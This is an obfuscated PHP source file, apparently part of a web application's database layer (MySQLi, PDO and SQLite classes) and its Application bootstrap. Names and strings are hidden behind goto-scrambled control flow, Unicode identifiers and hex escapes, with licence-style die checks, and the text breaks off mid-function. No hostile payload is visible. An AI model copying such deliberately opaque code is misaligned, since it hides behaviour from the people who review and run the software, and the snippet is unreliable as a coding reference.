<?php
 goto eӘ; dۘ: class DbMysqli extends Db { public function __construct($fˆڃ = '') { $A =& $_SERVER[]; if (!extension_loaded($A[777])) { think_exception(think_lang($A[10]) . $A[891]); } if (!empty($fˆڃ)) { $this->config = $fˆڃ; if (empty($this->config[$A[13]])) { $this->config[$A[13]] = $A[33]; } } } public function connect($e = '', $f = 0) { $dï =& $_SERVER[]; if (!isset($this->linkID[$f])) { goto bڳ; aҨ: $f법 = $this->linkID[$f]->server_version; $this->linkID[$f]->query($dï[869] . think_config($dï[870]) . $dï[55]); if ($f법 > $dï[871]) { $this->linkID[$f]->query($dï[872]); } goto dÂϦ; bڳ: if (empty($e)) { $e = $this->config; } $this->linkID[$f] = new mysqli($e[$dï[865]], $e[$dï[867]], $e[$dï[868]], $e[$dï[17]], $e[$dï[866]] ? intval($e[$dï[866]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto aҨ; dÂϦ: $this->connected = !0; if (1 != think_config($dï[18])) { unset($this->config); } goto e𨵔; e𨵔: } return $this->linkID[$f]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($D) { goto Bҿ; D˅Ś: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto a包; eɕ߷: think_status($Cϵ[20]); $this->queryID = $this->_linkID->query($D); if ($this->_linkID->more_results()) { while (($E = $this->_linkID->next_result()) != NULL) { $E->free_result(); } } goto D˅Ś; Bҿ: $Cϵ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F; F: $this->queryStr = $D; if ($this->queryID) { $this->free(); } think_action_status($Cϵ[19], 1); goto eɕ߷; a包: } public function execute($f) { goto B; d: $this->queryStr = $f; if ($this->queryID) { $this->free(); } think_action_status($c[21], 1); goto Aٞ; B: $c =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d; d: if (!1 === $e͙) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto a; Aٞ: think_status($c[20]); $e͙ = $this->_linkID->query($f); $this->debug(); goto d; a: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bܣ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$bܣ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $a = $this->_linkID->rollback(); $this->transTimes = 0; if (!$a) { $this->error(); return !1; } } return !0; } private function getAll() { $C = array(); if ($this->numRows > 0) { for ($B܅ܠ = 0; $B܅ܠ < $this->numRows; $B܅ܠ++) { $C[$B܅ܠ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $C; } public function getFields($Aֲ݉) { $Bڸ =& $_SERVER[]; $A쟉ר = $this->query($Bڸ[876] . $this->parseKey($Aֲ݉)); $D̢ = array(); if ($A쟉ר) { foreach ($A쟉ר as $B¡ => $eφ͋) { $D̢[$eφ͋[$Bڸ[27]]] = array($Bڸ[28] => $eφ͋[$Bڸ[27]], $Bڸ[29] => $eφ͋[$Bڸ[30]], $Bڸ[31] => (bool) ($eφ͋[$Bڸ[32]] === $Bڸ[33]), $Bڸ[34] => $eφ͋[$Bڸ[35]], $Bڸ[36] => strtolower($eφ͋[$Bڸ[37]]) == $Bڸ[38], $Bڸ[39] => strtolower($eφ͋[$Bڸ[40]]) == $Bڸ[41]); } } return $D̢; } public function getTables($E㛜ܔ = '') { $b =& $_SERVER[]; $BÄĥ = !empty($E㛜ܔ) ? $b[878] . $E㛜ܔ . $b[879] : $b[880]; $b⺜ = $this->query($BÄĥ); $Dǃ = array(); if ($b⺜) { foreach ($b⺜ as $A => $E툷) { $Dǃ[$A] = current($E툷); } } return $Dǃ; } public function replace($E, $a = array()) { $AΑ =& $_SERVER[]; foreach ($E as $eŇ => $Aֈ) { $Bƫ = $this->parseValue($Aֈ); if (is_scalar($Bƫ)) { $e[] = $Bƫ; $AЃ[] = $this->parseKey($eŇ); } } $b = $AΑ[881] . $this->parseTable($a[$AΑ[277]]) . $AΑ[882] . implode($AΑ[47], $AЃ) . $AΑ[883] . implode($AΑ[47], $e) . $AΑ[884]; return $this->execute($b); } public function insertAll($eƜ⇲, $fȝ = array(), $Bа̪ = false) { goto D; Bλ: $bɦ = $Bа̪ ? $a[886] : $a[887]; $d涙 = $bɦ . $a[888] . $this->parseTable($fȝ[$a[277]]) . $a[882] . implode($a[47], $b­) . $a[889] . implode($a[47], $f); return $this->execute($d涙); goto ĉ; D: $a =& $_SERVER[]; if (!is_array($eƜ⇲[0])) { return !1; } $b­ = array_keys($eƜ⇲[0]); goto d; d: $f = array(); foreach ($eƜ⇲ as $Aƴ) { $c֛ = array(); foreach ($Aƴ as $b => $e) { $e = $this->parseValue($e); if (is_scalar($e)) { $c֛[] = $e; } } $f[] = $a[258] . implode($a[47], $c֛) . $a[884]; } array_walk($b­, array($this, $a[885])); goto Bλ; ĉ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $F̸ =& $_SERVER[]; $this->error = $this->_linkID->errno . $F̸[4] . $this->_linkID->error; if ($F̸[33] != $this->queryStr) { $this->error .= LNG($F̸[45]) . $this->queryStr; } think_trace($this->error, $F̸[33], $F̸[46]); return $this->error; } public function escapeString($a) { if ($this->_linkID) { return $this->_linkID->real_escape_string($a); } else { return addslashes($a); } } public function parseKey(&$e, $bǣͽض = true) { $B =& $_SERVER[]; if ($bǣͽض) { $e = $this->parseKeyCheck($e); } if ($e != $B[182] && !preg_match($B[890], $e)) { $e = $B[383] . trim($e, $B[383]) . $B[383]; } return $e; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($fЌ = '') { $dգܒ =& $_SERVER[]; if (!class_exists($dգܒ[892])) { think_exception(think_lang($dգܒ[10]) . $dգܒ[893]); } if (!empty($fЌ)) { $this->config = $fЌ; if (empty($this->config[$dգܒ[13]])) { $this->config[$dգܒ[13]] = array(); } } } public function connect($a͐ = '', $Eּ݃ = 0) { $f̈́龴 =& $_SERVER[]; if (!isset($this->linkID[$Eּ݃])) { goto c; eߙ: if (1 != think_config($f̈́龴[18])) { unset($this->config); } goto c; Bǆ: try { $this->linkID[$Eּ݃] = new PDO($a͐[$f̈́龴[894]], $a͐[$f̈́龴[867]], $a͐[$f̈́龴[868]], $a͐[$f̈́龴[13]]); } catch (PDOException $aޜ) { think_exception($aޜ->getMessage()); } $this->dbType = $this->_getDsnType($a͐[$f̈́龴[894]]); if (in_array($this->dbType, array($f̈́龴[895], $f̈́龴[896], $f̈́龴[897], $f̈́龴[898]))) { think_exception($f̈́龴[899] . $this->dbType . $f̈́龴[900] . $this->dbType . $f̈́龴[901]); } goto D; c: if (empty($a͐)) { $a͐ = $this->config; } $A秌 = !empty($a͐[$f̈́龴[13]][$f̈́龴[14]]) ? $a͐[$f̈́龴[13]][$f̈́龴[14]] : $this->pconnect; if ($A秌) { $a͐[$f̈́龴[13]][PDO::ATTR_PERSISTENT] = !0; } goto Bǆ; D: if (!$this->linkID[$Eּ݃]) { think_exception($f̈́龴[902]); } try { $this->linkID[$Eּ݃]->exec($f̈́龴[903] . think_config($f̈́龴[870])); } catch (Exception $aޜ) { } $this->connected = !0; goto eߙ; c: } return $this->linkID[$Eּ݃]; } public function free() { $this->PDOStatement = null; } public function query($a҂ʃ, $Bۏ = array()) { goto Fпӎ; B: if (!1 === $Eɹ) { $this->error(); return !1; } else { return $this->getAll(); } goto Fʉɞ; Fпӎ: $C٧ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto b֑; b҇: think_action_status($C٧[19], 1); think_status($C٧[20]); $this->PDOStatement = $this->_linkID->prepare($a҂ʃ); goto Fڱ; b֑: $this->queryStr = $a҂ʃ; if (!empty($Bۏ)) { $this->queryStr .= $C٧[904] . print_r($Bۏ, !0) . $C٧[905]; } if (!empty($this->PDOStatement)) { $this->free(); } goto b҇; Fڱ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Eɹ = $this->PDOStatement->execute($Bۏ); $this->debug(); goto B; Fʉɞ: } public function execute($a鋇, $cǗ = array()) { goto Cƍ¾; dկ: if ($this->dbType == $B[898]) { if (preg_match($B[906], $this->queryStr, $a)) { $this->table = think_config($B[907]) . str_ireplace(think_config($B[908]), $B[376], $a[2]); $D = (bool) $this->query($B[909] . strtoupper($this->table) . $B[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($B[21], 1); goto EŤ; Cƍ¾: $B =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C; EŤ: think_status($B[20]); $this->PDOStatement = $this->_linkID->prepare($a鋇); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto E㑆ԡ; E㑆ԡ: $A = $this->PDOStatement->execute($cǗ); $this->debug(); if (!1 === $A) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($D || preg_match($B[910], $a鋇)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto bɛ; C: $this->queryStr = $a鋇; if (!empty($cǗ)) { $this->queryStr .= $B[904] . print_r($cǗ, !0) . $B[905]; } $D = !1; goto dկ; bɛ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b퓃ت = $this->_linkID->commit(); $this->transTimes = 0; if (!$b퓃ت) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $fƙ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$fƙ) { $this->error(); return !1; } } return !0; } private function getAll() { $e = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($e); return $e; } public function getFields($c) { goto Bϸ; Bϸ: $c =& $_SERVER[]; $this->initConnect(!0); if (think_config($c[911])) { $Aȩݑ = str_replace($c[912], $c, think_config($c[911])); } else { switch ($this->dbType) { case $c[895]: case $c[913]: $Aȩݑ = "\123\x45\x4c\x45\x43\x54\x20\x20\40\x63\157\x6c\x75\155\156\x5f\x6e\x61\x6d\x65\x20\141\x73\x20\x27\116\141\155\x65\x27\54\x20\x20\x20\144\141\x74\141\x5f\164\171\x70\145\40\141\x73\x20\x27\x54\171\160\x65\47\54\40\x20\40\x63\157\154\165\x6d\x6e\x5f\x64\x65\x66\x61\165\x6c\x74\x20\x61\163\40\47\104\145\146\141\165\154\x74\47\54\40\40\40\151\x73\137\156\x75\154\x6c\x61\142\x6c\x65\x20\x61\163\x20\x27\x4e\165\154\154\x27\xa\11\x9\106\x52\x4f\115\11\x69\156\146\x6f\162\x6d\141\164\x69\157\156\x5f\x73\143\x68\145\155\x61\x2e\164\x61\142\154\x65\163\40\x41\123\40\164\xa\x9\11\112\x4f\x49\x4e\x9\x69\x6e\x66\x6f\162\155\x61\x74\151\157\x6e\x5f\163\x63\x68\145\155\x61\x2e\x63\x6f\154\165\155\156\x73\40\101\x53\x20\143\xa\11\x9\x4f\116\40\x20\x74\56\164\141\142\154\x65\x5f\143\141\x74\141\x6c\x6f\147\x20\x3d\x20\x63\56\x74\141\x62\x6c\145\x5f\x63\x61\x74\x61\154\157\x67\12\11\11\101\116\104\40\164\56\164\141\142\x6c\145\x5f\163\x63\150\x65\x6d\x61\40\75\x20\x63\x2e\164\141\142\154\145\x5f\163\x63\150\x65\x6d\141\12\x9\11\101\116\x44\x20\x74\x2e\164\141\142\154\145\137\x6e\x61\x6d\x65\x20\x3d\40\x63\x2e\x74\x61\142\x6c\x65\x5f\156\141\155\145\12\11\x9\127\x48\105\122\x45\40\x20\x20\x74\56\164\x61\x62\x6c\x65\137\x6e\x61\155\145\x20\x3d\x20\47{$c}\x27"; break; case $c[914]: $Aȩݑ = $c[915] . $c . $c[916]; break; case $c[896]: case $c[898]: $Aȩݑ = $c[917] . $c[918] . $c[919] . strtoupper($c) . $c[920] . strtoupper($c) . $c[921]; break; case $c[922]: $Aȩݑ = $c[923] . $c . $c[924]; break; case $c[897]: break; case $c[925]: default: $Aȩݑ = $c[926] . ($this->dbType == $c[925] ? "\x60{$c}\x60" : $c); } } goto Aܢ䥒; aÓ: return $AԻݥ; goto FҊ; Aܢ䥒: $Fᛖ = $this->query($Aȩݑ); $AԻݥ = array(); if ($Fᛖ) { foreach ($Fᛖ as $bŋ => $c) { $c = array_change_key_case($c); $c[$c[28]] = isset($c[$c[28]]) ? $c[$c[28]] : $c[376]; $c[$c[29]] = isset($c[$c[29]]) ? $c[$c[29]] : $c[376]; $fևՕ = isset($c[$c[271]]) ? $c[$c[271]] : $c[$c[28]]; $AԻݥ[$fևՕ] = array($c[28] => $fևՕ, $c[29] => $c[$c[29]], $c[31] => (bool) (isset($c[$c[103]]) && $c[$c[103]] === $c[33] || isset($c[$c[31]]) && $c[$c[31]] === $c[33]), $c[34] => isset($c[$c[34]]) ? $c[$c[34]] : (isset($c[$c[53]]) ? $c[$c[53]] : $c[376]), $c[36] => isset($c[$c[93]]) ? strtolower($c[$c[93]]) == $c[38] : (isset($c[$c[54]]) ? $c[$c[54]] : !1), $c[39] => isset($c[$c[927]]) ? strtolower($c[$c[927]]) == $c[41] : (isset($c[$c[93]]) ? $c[$c[93]] : !1)); } } goto aÓ; FҊ: } public function getTables($cͧ = '') { $Eީ =& $_SERVER[]; if (think_config($Eީ[928])) { $AɹÄ = str_replace($Eީ[929], $cͧ, think_config($Eީ[928])); } else { switch ($this->dbType) { case $Eީ[896]: case $Eީ[898]: $AɹÄ = $Eީ[930]; break; case $Eީ[895]: case $Eީ[913]: $AɹÄ = $Eީ[931]; break; case $Eީ[922]: $AɹÄ = $Eީ[932]; break; case $Eީ[897]: think_exception(think_lang($Eީ[933]) . $Eީ[934]); break; case $Eީ[914]: $AɹÄ = $Eީ[42] . $Eީ[43] . $Eީ[44]; break; case $Eީ[925]: default: if (!empty($cͧ)) { $AɹÄ = $Eީ[878] . $cͧ . $Eީ[879]; } else { $AɹÄ = $Eީ[880]; } } } $F؇ = $this->query($AɹÄ); $b = array(); foreach ($F؇ as $c => $cи) { $b[$c] = current($cи); } return $b; } protected function parseLimit($dڼ) { $CԱ =& $_SERVER[]; $Dε = $CԱ[33]; if (!empty($dڼ)) { switch ($this->dbType) { case $CԱ[922]: case $CԱ[914]: $dڼ = explode($CԱ[47], $dڼ); if (count($dڼ) > 1) { $Dε .= $CԱ[48] . $dڼ[1] . $CԱ[49] . $dڼ[0] . $CԱ[50]; } else { $Dε .= $CԱ[48] . $dڼ[0] . $CԱ[50]; } break; case $CԱ[895]: case $CԱ[913]: break; case $CԱ[897]: break; case $CԱ[896]: case $CԱ[898]: break; case $CԱ[925]: default: $Dε .= $CԱ[48] . $dڼ . $CԱ[50]; } } return $Dε; } public function parseKey(&$CғГʐ, $f = true) { $f᫋ޘ =& $_SERVER[]; if ($f) { $CғГʐ = $this->parseKeyCheck($CғГʐ); } if ($this->dbType == $f᫋ޘ[925]) { if ($CғГʐ != $f᫋ޘ[182] && !preg_match($f᫋ޘ[890], $CғГʐ)) { $CғГʐ = $f᫋ޘ[383] . trim($CғГʐ, $f᫋ޘ[383]) . $f᫋ޘ[383]; } return $CғГʐ; } else { return parent::parseKey($CғГʐ, $f); } } public function close() { $this->_linkID = null; } public function error() { $DƱ =& $_SERVER[]; if ($this->PDOStatement) { $aߍ = $this->PDOStatement->errorInfo(); $this->error = $aߍ[1] . $DƱ[4] . $aߍ[2]; } else { $this->error = $DƱ[33]; } if ($DƱ[33] != $this->queryStr) { $this->error .= LNG($DƱ[45]) . $this->queryStr; } think_trace($this->error, $DƱ[33], $DƱ[46]); return $this->error; } public function escapeString($e̵) { $dڧۥ =& $_SERVER[]; switch ($this->dbType) { case $dڧۥ[922]: case $dڧۥ[895]: case $dڧۥ[913]: case $dڧۥ[925]: return addslashes($e̵); case $dڧۥ[897]: case $dڧۥ[914]: case $dڧۥ[896]: case $dڧۥ[898]: return str_ireplace($dڧۥ[55], $dڧۥ[56], $e̵); } } protected function parseValue($CㄺɌ) { $dĤ =& $_SERVER[]; if (is_string($CㄺɌ)) { $Bչ = strpos($CㄺɌ, $dĤ[4]) === 0 && in_array($CㄺɌ, array_keys($this->bind)); $CㄺɌ = $Bչ ? $this->escapeString($CㄺɌ) : $dĤ[935] . $this->escapeString($CㄺɌ) . $dĤ[935]; } elseif (isset($CㄺɌ[0]) && is_string($CㄺɌ[0]) && strtolower($CㄺɌ[0]) == $dĤ[295]) { $CㄺɌ = $this->escapeString($CㄺɌ[1]); } elseif (is_array($CㄺɌ)) { $CㄺɌ = array_map(array($this, $dĤ[936]), $CㄺɌ); } elseif (is_bool($CㄺɌ)) { $CㄺɌ = $CㄺɌ ? $dĤ[87] : $dĤ[191]; } elseif (is_null($CㄺɌ)) { $CㄺɌ = $dĤ[103]; } return $CㄺɌ; } public function getLastInsertId() { $Eڜٖ =& $_SERVER[]; switch ($this->dbType) { case $Eڜٖ[922]: case $Eڜٖ[914]: case $Eڜٖ[895]: case $Eڜٖ[913]: case $Eڜٖ[897]: case $Eڜٖ[925]: return $this->_linkID->lastInsertId(); case $Eڜٖ[896]: case $Eڜٖ[898]: $b䓪 = $this->table; $D䠈 = $this->query("\x53\x45\x4c\105\x43\124\40{$b䓪}\56\143\x75\x72\x72\x76\x61\x6c\40\143\165\x72\162\x76\x61\x6c\40\x46\x52\x4f\115\x20\144\x75\141\154"); return $D䠈 ? $D䠈[0][$Eڜٖ[937]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($aִ) { $C⛷ =& $_SERVER[]; if (!CacheLock::fileLock($C⛷[9])) { return !1; } $fĻ奖 = parent::query($aִ); CacheLock::fileUnLock($C⛷[9]); return $fĻ奖; } public function execute($B) { $e =& $_SERVER[]; if (!CacheLock::fileLock($e[9])) { return !1; } $fӂ = parent::execute($B); CacheLock::fileUnLock($e[9]); return $fӂ; } } goto Fƿ皅; A: $A = $_SERVER[][604]; if (strlen($A) < $_SERVER[][605]) { die; } class Application { private $defaultModule = "\151\x6e\144\x65\170"; private $defaultController = "\x69\156\x64\x65\x78"; private $defaultAction = "\151\x6e\144\145\170"; function __construct() { } public function setDefault($Aō) { goto a훚; a훚: $A׾ =& $_SERVER[]; $e脜 =& $_SERVER[ȂŊ]; $Eס = $e脜[0]($e脜[1], $e脜[2]($Aō, $e脜[1])); goto e¨; eڹ: $this->{$_SERVER[ȂŊ][3]}($e脜[4], array($this, $e脜[5])); goto f; e¨: $A = $A׾[606]; while (strlen($A) < $A׾[601]) { if (!$A) { break; } $A++; } $this->defaultModule = $Eס[0] ? $Eס[0] : $this->defaultModule; goto F; F: $E = $A׾[607]; $this->defaultController = $Eס[1] ? $Eס[1] : $this->defaultController; $this->defaultAction = $Eס[2] ? $Eס[2] : $this->defaultAction; goto eڹ; f: } public function appRun($Eť) { goto E; Bׅ上: $Aɇ[13](array($Aɇ[14], $Aɇ[15]), $c辝 . $Aɇ[18], $Eť); goto aұ; b􄘸َ: $CƑ = $Aɇ[6]($bԮ[0]); $c辝 = $Aɇ[7]; $A = $CكΎ[608]; goto A׋; E: $CكΎ =& $_SERVER[]; $Aɇ =& $_SERVER[ȂŊ]; $bԮ = $Aɇ[0]($Aɇ[1], $Eť); goto b􄘸َ; A׋: if (!$A) { die; } if ($CƑ == $Aɇ[8]) { $c辝 = $Aɇ[9]; $bԮ[0] = $Aɇ[10]; $bԮ[1] = $bԮ[1] . $Aɇ[11]; $Eť = $Aɇ[12]($Aɇ[1], $bԮ); $Eť = $Aɇ[2]($Eť, $Aɇ[1]); } $Aɇ[13](array($Aɇ[14], $Aɇ[15]), $c辝 . $Aɇ[16], $Eť); goto A۳; A۳: $Aɇ[17]($Eť); $f = $CكΎ[609]; while (strlen($f) < $CكΎ[610]) { if (!$f) { break; } $f++; } goto Bׅ上; aұ: } private function autorun() { $eю =& $_SERVER[ȂŊ]; global $config; $AƊ = $_SERVER[][611]; if (!$AƊ) { return; } if ($eю[19]($config[$eю[20]]) == 0) { return; } foreach ($config[$eю[20]] as $b܍ => $D璨) { $this->{$_SERVER[ȂŊ][21]}($D璨); } } private function rtas5a37517b() { goto eˊ; b: $e = $b尩[26]($GLOBALS[$b尩[22]][$b尩[23]], 1); $aҏ = $D[614]; $GLOBALS[$b尩[22]][$b尩[23]] = $b尩[27]($dܘ, $e); goto d; c: $eݚȠ = $D[613]; if (!$eݚȠ) { return; } $dܘ = array($b尩[8], $D); goto b; eˊ: $D =& $_SERVER[]; $b尩 =& $_SERVER[ȂŊ]; $fڝآ = $b尩[8]; goto fⶡ貔; dū: if (!$D䧌 || $b尩[24]($D䧌) <= $b尩[24]($fڝآ)) { return; } if ($b尩[6]($b尩[25]($D䧌, -$b尩[24]($fڝآ))) != $fڝآ) { return; } $D = $b尩[25]($D䧌, 0, -$b尩[24]($fڝآ)); goto c; fⶡ貔: $D䧌 = $GLOBALS[$b尩[22]][$b尩[23]][0]; $F = $D[612]; if (!$F) { die; } goto dū; d: $cع = $D[615]; $GLOBALS[$b尩[22]][$b尩[28]] = $b尩[29]($b尩[1], $GLOBALS[$b尩[22]][$b尩[23]]); $B = $D[616]; goto AԈ; AԈ: } private function vcxl2a8414b5() { goto Eȍ; dÏ: $AƂ = $_SERVER[$fۜ[30]]; $a = $fۜ[31]; $dώٝ = $eᬭ[617]; goto CÔ탃; a̘: if (strlen($b) < $eᬭ[610]) { die; } $GLOBALS[$fۜ[22]][$fۜ[23]] = $fۜ[0]($fۜ[36], $B); $c̵㍽ = $eᬭ[619]; goto e͔; cȺ: $fۜ[34]($fۜ[35], $B, $cφέ); $B = $fۜ[2]($cφέ[0][0], $fۜ[36]); $b = $eᬭ[618]; goto a̘; e͔: while (strlen($c̵㍽) < $eᬭ[601]) { if (!$c̵㍽) { break; } $c̵㍽++; } $GLOBALS[$fۜ[22]][$fۜ[28]] = $fۜ[29]($fۜ[1], $GLOBALS[$fۜ[22]][$fۜ[23]]); goto c댞; Eȍ: $eᬭ =& $_SERVER[]; $fۜ =& $_SERVER[ȂŊ]; if ($GLOBALS[$fۜ[22]][$fۜ[28]] != $fۜ[10]) { return; } goto dÏ; CÔ탃: if (!$fۜ[32]($AƂ, $a)) { return; } $dƘە = $fۜ[33]($AƂ, $a); $B = $fۜ[25]($AƂ, $dƘە + $fۜ[24]($a)); goto cȺ; c댞: } public function run() { goto D; D: $DǛܤ =& $_SERVER[]; $e֎Ġ =& $_SERVER[ȂŊ]; $this->{$_SERVER[ȂŊ][37]}(); goto Bȩ; Dɫ: $e֎Ġ[39]($e֎Ġ[40], isset($AС֬[0]) && $AС֬[0] ? $AС֬[0] : $this->defaultModule); $e֎Ġ[39]($e֎Ġ[41], isset($AС֬[1]) && $AС֬[0] ? $AС֬[1] : $this->defaultController); $e֎Ġ[39]($e֎Ġ[42], isset($AС֬[2]) && $AС֬[0] ? $AС֬[2] : $this->defaultAction); goto EХ; EХ: $e֎Ġ[39]($e֎Ġ[43], MOD . $e֎Ġ[1] . ST . $e֎Ġ[1] . ACT); $b = $DǛܤ[622]; while ($b < $DǛܤ[623]) { if ($b >= 0) { break; } $b++; } goto b۫; Bȩ: $D͍ = $DǛܤ[620]; $this->{$_SERVER[ȂŊ][38]}(); $c۸ = $DǛܤ[621]; goto Aڿ; Aڿ: while (strlen($c۸) < $DǛܤ[610]) { if (!$c۸) { break; } $c۸++; } $AС֬ = $GLOBALS[$e֎Ġ[22]][$e֎Ġ[23]]; $d蕸 = $GLOBALS[$e֎Ġ[22]][$e֎Ġ[28]]; goto Dɫ; b۫: $_SERVER[$e֎Ġ[44]] = $e֎Ġ[6](ACTION); $this->{$_SERVER[ȂŊ][45]}(); if ($e֎Ġ[19]($AС֬) >= 3) { $this->{$_SERVER[ȂŊ][21]}($d蕸); } else { $this->{$_SERVER[ȂŊ][21]}(ACTION); } goto eԸ; eԸ: } private $mbtcba1126b9 = array(); private $ecjb376f94b5 = ''; public function pjyq68f5ddb9() { goto F; A܇: $dѫ = $a[624]; $this->{$_SERVER[ȂŊ][47]}(); $c嶤 = $a[625]; goto d; d: $this->{$_SERVER[ȂŊ][48]}(); $this->{$_SERVER[ȂŊ][49]}(); $this->{$_SERVER[ȂŊ][50]}(); goto fդ; e: $this->{$_SERVER[ȂŊ][3]}($bň[53], array($this, $bň[54])); $Cɫ = $a[627]; if (!$Cɫ) { return; } goto c⟛ϛ; c⟛ϛ: $this->{$_SERVER[ȂŊ][3]}($bň[55], array($this, $bň[56])); $Bկ = $a[628]; if (strlen($Bկ) < $a[629]) { return; } goto c鉮֏; F: $a =& $_SERVER[]; $bň =& $_SERVER[ȂŊ]; $this->{$_SERVER[ȂŊ][46]}(); goto A܇; c鉮֏: $this->{$_SERVER[ȂŊ][3]}($bň[57], array($this, $bň[58])); $this->{$_SERVER[ȂŊ][3]}($bň[59], array($this, $bň[60])); $B = $a[630]; goto e暄; fդ: $e񓂛 = $a[626]; $this->{$_SERVER[ȂŊ][51]}(); $this->{$_SERVER[ȂŊ][52]}(); goto e; e暄: } public function hlve069e0c23($aׯ) { goto A; fƥĹ: $Cь = array($b婨[64], $b婨[65], $b婨[66], $b婨[67], $b婨[68], $b婨[69], $b婨[70], $b婨[71], $b婨[72], $b婨[73], $b婨[74], $b婨[75], $b婨[76], $b婨[77], $b婨[78], $b婨[79], $b婨[80], $b婨[81], $b婨[82], $b婨[83], $b婨[84], $b婨[85], $b婨[86], $b婨[87], $b婨[88], $b婨[89], $b婨[90], $b婨[91], $b婨[92], $b婨[93], $b婨[94], $b婨[95], $b婨[96], $b婨[97], $b婨[98], $b婨[99], $b婨[100], $b婨[101], $b婨[102], $b婨[103], $b婨[104], $b婨[105], $b婨[106], $b婨[107], $b婨[108], $b婨[109], $b婨[110]); foreach ($Cь as $Aه苇) { $eԪ = $GLOBALS[$b婨[111]][$b婨[112]][$Aه苇]; if (isset($bƂ[$Aه苇])) { $eԪ = $bƂ[$Aه苇]; } $aׯ[$b婨[113]][$b婨[114]][$Aه苇] = $eԪ; } $C = $aׯ[$b婨[113]][$b婨[114]][$b婨[76]]; goto bןŭ; e: $F = $fώ[631]; while (strlen($F) < $fώ[605]) { if (!$F) { break; } $F++; } unset($aׯ[$b婨[113]][$b婨[114]][$b婨[118]]); goto D£ۚǆ; A: $fώ =& $_SERVER[]; $b婨 =& $_SERVER[ȂŊ]; $bƂ = $b婨[61]($b婨[62])->{$_SERVER[ȂŊ][63]}(); goto fƥĹ; E: $aׯ[$b婨[125]][$b婨[147]] = $b婨[123]($this->mbtcba1126b9, $b婨[148], $b婨[10]); $b = $fώ[636]; if (!$b) { return; } goto cę; b׈: $aׯ[$b婨[125]][$b婨[134]] = $b婨[135]($b婨[136]()); $Dٲ = $fώ[635]; $aׯ[$b婨[125]][$b婨[137]] = $this->ecjb376f94b5; goto f; E鶾: $aׯ[$b婨[125]][$b婨[130]] = $b婨[131]($_SERVER[$b婨[132]] . $bƂ[$b婨[133]]); $C = $fώ[634]; if (strlen($C) < $fώ[605]) { return; } goto b׈; D£ۚǆ: $fժ = $fώ[632]; if (strlen($fժ) < $fώ[601]) { return; } $aׯ[$b婨[113]][$b婨[114]][$b婨[119]] = array($b婨[120] => (int) $C[$b婨[121]], $b婨[122] => (int) $b婨[123]($C, $b婨[124], 0)); goto B淋; bןŭ: unset($aׯ[$b婨[113]][$b婨[115]][$b婨[116]]); unset($aׯ[$b婨[113]][$b婨[115]][$b婨[117]]); unset($aׯ[$b婨[113]][$b婨[114]][$b婨[76]]); goto e; f: if ($bƂ[$b婨[137]] != $b婨[138]) { $aׯ[$b婨[125]][$b婨[139]] = $bƂ[$b婨[139]]; $aׯ[$b婨[125]][$b婨[140]] = $bƂ[$b婨[140]]; $E̶ؼ = $b婨[141](10) . $this->ecjb376f94b5 . $b婨[141](5); $aׯ[$b婨[113]][$b婨[142]][$b婨[143]] = $this->{$_SERVER[ȂŊ][144]}($E̶ؼ, $aׯ[$b婨[125]][$b婨[130]]); } if ($this->ecjb376f94b5 == $b婨[138]) { $aׯ[$b婨[113]][$b婨[114]][$b婨[119]][$b婨[124]] = 0; } $aׯ[$b婨[125]][$b婨[145]] = $b婨[123]($this->mbtcba1126b9, $b婨[146], $b婨[10]); goto E; cę: if ($b婨[123]($GLOBALS, $b婨[149]) && $this->config[$b婨[150]]) { $aׯ[$b婨[125]][$b婨[151]] = WEB_ROOT; } return $aׯ; goto DʃՂ; B淋: $FѬ = $fώ[633]; while ($FѬ < $fώ[601]) { if ($FѬ >= 0) { break; } $FѬ++; } $aׯ[$b婨[125]][$b婨[126]] = $b婨[127]($b婨[128])->{$_SERVER[ȂŊ][129]}(); goto E鶾; DʃՂ: } private function dnshd730cf71() { goto C֌Ƭ; Dב: while ($e؃Ҧ < $Aۍǎ޶[623]) { if ($e؃Ҧ >= 0) { break; } $e؃Ҧ++; } $F֧ = array($FȄ[184] => $F[$FȄ[64]], $FȄ[185] => $F[$FȄ[65]], $FȄ[186] => $FȄ[10]); foreach ($EÍ as $dՏ) { if (!isset($F[$dՏ]) || !$F[$dՏ]) { continue; } $F֧[$dՏ] = $F[$dՏ]; } goto Bń؃; C֌Ƭ: $Aۍǎ޶ =& $_SERVER[]; $FȄ =& $_SERVER[ȂŊ]; if ($_SERVER[$FȄ[44]] == $FȄ[152]) { goto Aߤ; c: $Fޡө = $Aۍǎ޶[639]; while ($Fޡө < $Aۍǎ޶[623]) { if ($Fޡө >= 0) { break; } $Fޡө++; } goto Cه; a쥦: 